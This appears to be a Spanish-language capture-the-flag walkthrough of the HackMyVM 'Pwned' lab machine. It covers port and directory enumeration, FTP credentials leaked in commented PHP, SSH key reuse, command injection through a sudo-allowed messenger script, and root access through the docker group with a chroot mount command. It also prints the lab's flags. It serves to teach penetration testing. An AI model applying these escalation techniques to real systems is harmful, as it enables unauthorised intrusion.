---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pwned HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 03:21 EDT
Nmap scan report for 192.168.5.38
Host is up (0.00037s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe💿90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Pwned....!!
MAC Address: 08:00:27:51:18:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
```

Veremos que encontramos un puerto `80` y un `FTP`, en el `80` veremos que aloja una pagina wbe, en la que si entramos no veremos nada interesante, por lo que vamos a probar a conectarnos de forma anonima al `FTP` a ver si nos deja.

```shell
ftp anonymous@<IP>
```

Pero veremos que no nos deja, por lo que vamos a realizar un poco de `fuzzing` a ver que nos encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.38/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 3065]
/robots.txt           (Status: 200) [Size: 41]
/nothing              (Status: 200) [Size: 945]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/hidden_text (Status: 301) [Size: 318]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay un directorio bastante interesante llamado `/hidden_text` por lo que vamos a investigarlo, si entramos dentro de el veremos un archivo llamado `secret.dic`.

```
URL = http://<IP>/hidden_text
```

Por lo que podemos deducir que puede ser para utilizarlo con `gobuster` de nuevo, pero con ese diccionario de palabras.

```shell
gobuster dir -u http://<IP>/ -w secret.dic -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.38/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                secret.dic
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/pwned.vuln (Status: 301) [Size: 317]
Progress: 348 / 348 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que nos descubre un sitio web llamado `pwned.vuln` vamos a ver que contiene, entrando dentro veremos como una especie de `login`, si probamos credenciales por defecto no nos dejara, pero si inspeccionamos el codigo veremos lo siguiente:

```
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

Vemos unas credenciales las cuales parecen ser que son para el `FTP` vamos a probarlas de la siguiente forma.

## Escalate user ariana

### FTP

```shell
ftp ftpuser@<IP>
```

Metemos como contraseña `B0ss_B!TcH` y veremos que estamos dentro, si listamos veremos un directorio llamado `share` si entramos dentro veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||23156|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
```

Veremos una clave `PEM` y una nota, vamos a descargarnos las dos cosas con `get`.

```shell
get id_rsa
get note.txt
```

Ahora si nos salimos y leemos la nota veremos lo siguiente:

```
Wow you are here 

ariana won't happy about this note 

sorry ariana :(
```

Vemos un posible usuario para la `id_rsa` llamado `ariana` por lo que vamos a probar con dicho usuario.

## SSH

```shell
chmod 600 id_rsa
ssh -i id_rsa ariana@<IP>
```

Info:

```
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
ariana@pwned:~$ whoami
ariana
```

Con esto veremos que estaremos dentro, por lo que leeremos la primera `flag` de este usuario.

> user1.txt

```
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

## Escalate user selena

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```

Vemos que podemos ejecutar el script como el usuario `selena`, vamos a ver que realizar dicho script.

Si leemos el script, veremos lo siguiente:

```bash
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```

Vemos que esta utilizando `echo` para simular una especie de chat, vamos a ejecutarlo a ver que pasa.

```shell
sudo -u selena /home/messenger.sh
```

Info:

```
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :id

Sending message to selena 
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)

Message sent to selena :)
```

Vemos que se esta ejecutando los comandos que meto, en este caso `id` que por cierto estamos viendo que pertenece al grupo `docker`, vamos a poner directamente `bash` para obtener una shell como dicho usuario.

```shell
sudo -u selena /home/messenger.sh
```

Info:

```
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :bash

Sending message to selena 
whoami
selena
```

Ahora vamos a sanitizarlo un poco.

```shell
script /dev/null -c bash
```

Ahora leeremos la segunda `flag` del usuario.

> user2.txt

```
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

## Escalate Privileges

Si hacemos `id` veremos lo siguiente bastante interesante:

```shell
id
```

Info:

```
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Vemos que pertenece al grupo `docker` por lo que podremos realizar lo siguiente para ser `root`.

```shell
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

Info:

```
root@b5197dec18e9:/# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
4d4098d64e163d2726959455d046fd7c



You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker
```
